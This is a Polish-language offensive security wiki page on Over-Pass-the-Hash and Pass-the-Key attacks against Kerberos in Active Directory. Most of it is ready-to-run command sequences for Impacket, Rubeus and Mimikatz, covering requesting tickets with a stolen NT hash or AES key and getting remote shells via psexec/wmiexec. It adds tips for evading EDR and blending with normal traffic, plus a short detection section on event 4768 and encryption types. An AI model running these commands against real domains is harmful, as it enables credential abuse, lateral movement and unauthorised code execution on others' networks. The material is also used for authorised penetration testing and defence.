# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Atak **Overpass The Hash/Pass The Key (PTK)** jest przeznaczony dla środowisk, w których tradycyjny protokół NTLM jest ograniczony, a uwierzytelnianie Kerberos ma pierwszeństwo. Atak ten wykorzystuje hash NTLM lub klucze AES użytkownika do uzyskania ticketów Kerberos, umożliwiając nieautoryzowany dostęp do zasobów w sieci.

Ściśle mówiąc:

- **Over-Pass-the-Hash** zazwyczaj oznacza przekształcenie **NT hash** w Kerberos TGT za pomocą klucza **RC4-HMAC** Kerberos.
- **Pass-the-Key** to bardziej ogólna wersja, w której masz już klucz Kerberos, taki jak **AES128/AES256**, i bezpośrednio żądasz TGT przy jego użyciu.

Różnica ta ma znaczenie w hardened environments: jeśli **RC4 jest wyłączone** lub KDC nie zakłada już jego użycia, sam **NT hash** nie wystarczy i potrzebny jest **klucz AES** (lub hasło w postaci jawnego tekstu, aby go wyprowadzić).

Aby wykonać ten atak, pierwszym krokiem jest uzyskanie hash NTLM lub hasła konta zaatakowanego użytkownika. Po uzyskaniu tych informacji można otrzymać Ticket Granting Ticket (TGT) dla tego konta, co umożliwia atakującemu dostęp do usług lub maszyn, do których użytkownik ma uprawnienia.

Proces można rozpocząć za pomocą następujących commands:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
W scenariuszach wymagających AES256 można użyć opcji `-aesKey [AES key]`:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` obsługuje również bezpośrednie żądanie **service ticket za pośrednictwem AS-REQ** przy użyciu `-service <SPN>`, co może być przydatne, gdy potrzebujesz ticketu dla konkretnego SPN bez dodatkowego TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Ponadto uzyskany ticket może być używany z różnymi narzędziami, w tym `smbexec.py` lub `wmiexec.py`, rozszerzając zakres ataku.

Problemy takie jak _PyAsn1Error_ lub _KDC cannot find the name_ zwykle można rozwiązać, aktualizując bibliotekę Impacket lub używając hostname zamiast adresu IP, co zapewnia kompatybilność z Kerberos KDC.

Alternatywna sekwencja poleceń z użyciem Rubeus.exe pokazuje inny aspekt tej techniki:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ta metoda odzwierciedla podejście **Pass the Key**, koncentrując się na przejęciu i bezpośrednim wykorzystaniu biletu do celów uwierzytelniania. W praktyce:

- `Rubeus asktgt` samodzielnie wysyła **surowe żądania Kerberos AS-REQ/AS-REP** i nie wymaga uprawnień administratora, chyba że chcesz użyć `/luid` do wskazania innej sesji logowania lub utworzyć oddzielną sesję za pomocą `/createnetonly`.
- `mimikatz sekurlsa::pth` wstrzykuje dane uwierzytelniające do sesji logowania, a tym samym **uzyskuje dostęp do LSASS**, co zwykle wymaga lokalnych uprawnień administratora lub `SYSTEM` i jest bardziej podejrzane z perspektywy EDR.

Przykłady z użyciem Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Aby zachować bezpieczeństwo operacyjne i używać AES256, można zastosować następującą komendę:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` jest istotne, ponieważ ruch generowany przez Rubeus nieznacznie różni się od natywnego ruchu Windows Kerberos. Należy również pamiętać, że `/opsec` jest przeznaczone dla ruchu **AES256**; użycie go z RC4 zwykle wymaga `/force`, co niweczy znaczną część jego sensu, ponieważ **RC4 w nowoczesnych domenach samo w sobie jest silnym sygnałem**.

## Uwagi dotyczące wykrywania

Każde żądanie TGT generuje **zdarzenie `4768`** na kontrolerze domeny. W obecnych kompilacjach Windows to zdarzenie zawiera więcej przydatnych pól niż wspominają starsze opracowania:

- `TicketEncryptionType` informuje, który enctype został użyty dla wydanego TGT. Typowe wartości to `0x17` dla **RC4-HMAC**, `0x11` dla **AES128** oraz `0x12` dla **AES256**.<sup>[[3]](#references)</sup>
- Zaktualizowane zdarzenia udostępniają również `SessionKeyEncryptionType`, `PreAuthEncryptionType` oraz enctypes reklamowane przez klienta, co pomaga odróżnić **rzeczywistą zależność od RC4** od mylących ustawień domyślnych starszych systemów.
- Wystąpienie `0x17` w nowoczesnym środowisku jest dobrą wskazówką, że konto, host lub ścieżka fallback KDC nadal zezwala na RC4, a tym samym jest bardziej przyjazna dla Over-Pass-the-Hash opartego na NT-hash.

Microsoft stopniowo ogranicza domyślne użycie RC4 od czasu aktualizacji hardeningu Kerberos z listopada 2022 roku, a obecne opublikowane zalecenia mówią o **usunięciu RC4 jako domyślnie zakładanego enctype dla kontrolerów domeny AD do końca Q2 2026**. Z perspektywy ofensywnej oznacza to, że **Pass-the-Key z AES** staje się coraz bardziej niezawodną ścieżką, podczas gdy klasyczny **OpTH oparty wyłącznie na NT-hash** będzie coraz częściej kończył się niepowodzeniem w zahartowanych środowiskach.<sup>[[3]](#references)</sup>

Więcej informacji na temat typów szyfrowania Kerberos i powiązanego działania mechanizmu ticketing znajdziesz tutaj:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Wersja zapewniająca większą dyskrecję

> [!WARNING]
> Każda logon session może mieć w danym momencie tylko jeden aktywny TGT, więc zachowaj ostrożność.

1. Utwórz nową logon session za pomocą **`make_token`** z Cobalt Strike.
2. Następnie użyj Rubeus, aby wygenerować TGT dla nowej logon session bez wpływania na istniejącą.

Podobną izolację można uzyskać bezpośrednio z Rubeus, korzystając z tymczasowej sesji **logon type 9**:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Zapobiega to nadpisaniu bieżącego TGT i jest zwykle bezpieczniejsze niż importowanie biletu do istniejącej sesji logowania.

## Referencje

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (repozytorium GitHub)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Wykrywanie i usuwanie użycia RC4 w Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
